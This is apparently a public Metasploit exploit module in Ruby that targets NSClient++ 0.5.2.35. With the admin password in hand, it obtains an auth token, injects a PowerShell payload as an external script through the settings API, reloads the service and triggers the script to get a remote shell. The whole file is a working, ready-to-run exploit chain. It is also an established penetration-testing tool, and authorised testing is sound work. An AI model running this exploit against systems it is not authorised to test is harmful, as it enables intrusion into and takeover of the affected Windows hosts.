##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Exploit::Remote::HttpServer
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'NSClient++ 0.5.2.35 - Authenticated Remote Code Execution',
        'Description' => %q{
          This module allows an attacker with knowledge of the admin password of NSClient++
          to start a privilege shell.
          For this module to work, both web interface of NSClient++ and `ExternalScripts` feature
          should be enabled.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'kindredsec', # POC on www.exploit-db.com
            'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
          ],
        'References' =>
          [
            ['EDB', '48360']
          ],
        'Platform' => %w[windows],
        'Arch' => [ARCH_X64],
        'Targets' =>
          [
            [
              'Windows',
              {
                'Arch' => [ARCH_X86, ARCH_X64],
                'Type' => :windows_powershell
              }
            ]
          ],
        'Privileged' => false,
        'DisclosureDate' => '2020-10-20',
        'DefaultTarget' => 0,
        'Notes' =>
          {
            'Stability' => [ CRASH_SAFE ],
            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
            'Reliability' => [ REPEATABLE_SESSION ]
          }
      )
    )

    register_options [
      OptString.new('PASSWORD', [true, 'Password to authenticate with on NSClient web interface', nil])
    ]
  end

  def generate_random_name
    (0...rand(8..13)).map { ('a'..'z').to_a[rand(26)] }.join
  end

  def configure_payload(token, cmd, key)
    print_status('Configuring Script with Specified Payload . . .')

    node = {
      'path' => '/settings/external scripts/scripts',
      'key' => key
    }
    value = { 'string_data' => cmd }
    update = { 'node' => node, 'value' => value }
    payload = [
      {
        'plugin_id' => '1234',
        'update' => update
      }
    ]
    json_data = { 'type' => 'SettingsRequestMessage', 'payload' => payload }

    r = send_request_cgi({
      'method' => 'POST',
      'data' => JSON.generate(json_data),
      'headers' => { 'TOKEN' => token },
      'uri' => normalize_uri('/settings/query.json')
    })

    if !r.body.to_s.include? 'STATUS_OK'
      print_error('Error configuring payload. Hit error at: ' + endpoint)
    end

    print_status('Added External Script (name: ' + key + ')')
    sleep(3)
    print_status('Saving Configuration . . .')
    header = { 'version' => '1' }
    payload = [ { 'plugin_id' => '1234', 'control' => { 'command' => 'SAVE' } } ]
    json_data = { 'header' => header, 'type' => 'SettingsRequestMessage', 'payload' => payload }

    send_request_cgi({
      'method' => 'POST',
      'data' => JSON.generate(json_data),
      'headers' => { 'TOKEN' => token },
      'uri' => normalize_uri('/settings/query.json')
    })
  end

  def reload_config(token)
    print_status('Reloading Application . . .')

    send_request_cgi({
      'method' => 'GET',
      'headers' => { 'TOKEN' => token },
      'uri' => normalize_uri('/core/reload')
    })

    print_status('Waiting for Application to reload . . .')
    sleep(10)
    response = false
    count = 0
    until response
      begin
        r = send_request_cgi({
          'method' => 'GET',
          'headers' => { 'TOKEN' => token },
          'uri' => normalize_uri('/')
        })
        if !r.body.empty?
          response = true
        end
      rescue StandardError
        count += 1
        if count > 10
          print_status('Application failed to reload. Nice DoS exploit! /s')
        end
      end
    end
  end

  def trigger_payload(token, key)
    print_status('Triggering payload, should execute shortly . . .')

    begin
      send_request_cgi({
        'method' => 'GET',
        'headers' => { 'TOKEN' => token },
        'uri' => normalize_uri('/query/' + key)
      })
    rescue StandardError
      print_status('Timeout exceeded. Assuming your payload executed . . .')
    end
  end

  def external_scripts_feature_enabled?(token)
    endpoint = '/registry/control/module/load?name=CheckExternalScripts'
    r = send_request_cgi({
      'method' => 'GET',
      'headers' => { 'TOKEN' => token },
      'uri' => normalize_uri(endpoint)
    })

    r.body.to_s.include? 'STATUS_OK'
  end

  def get_auth_token
    r = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/auth/token?password=' + datastore['PASSWORD'])
    })

    if r.code == 200
      begin
        auth_token = r.body.to_s[/"auth token": "(\w*)"/, 1]
        return auth_token
      rescue StandardError
        :no_token_found
      end
    else
      :wrong_password
    end
  rescue StandardError
    :failed_to_connect
  end

  def execute_command(_cmd, _opts = {})
    puts('bizarre')
  end

  def check
    token = get_auth_token

    if token == :failed_to_connect
      print_error("Can't access to NSClient web interface, maybe the web interface is not activated or something is wrong with the targeted host")
      CheckCode::Safe
    elsif token == :wrong_password
      print_error('Unable to connect to NSClient web interface because the admin password given is wrong')
      CheckCode::Unknown
    elsif token == :no_token_found
      print_error('Unable to get an authentification token, maybe the target is safe')
      CheckCode::Unknown
    else
      print_good('Got auth token: ' + token)
      if external_scripts_feature_enabled?(token)
        print_good('External scripts feature enabled !')
        CheckCode::Vulnerable
      else
        print_good('External scripts feature disabled !')
        CheckCode::Safe
      end
    end
  end

  def exploit
    cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)
    token = get_auth_token

    if token != :failed_to_connect && token != :wrong_password && token != :no_token_found
      rand_key = generate_random_name
      configure_payload(token, cmd, rand_key)
      reload_config(token)
      token = get_auth_token
      trigger_payload(token, rand_key)
    end
  end
end
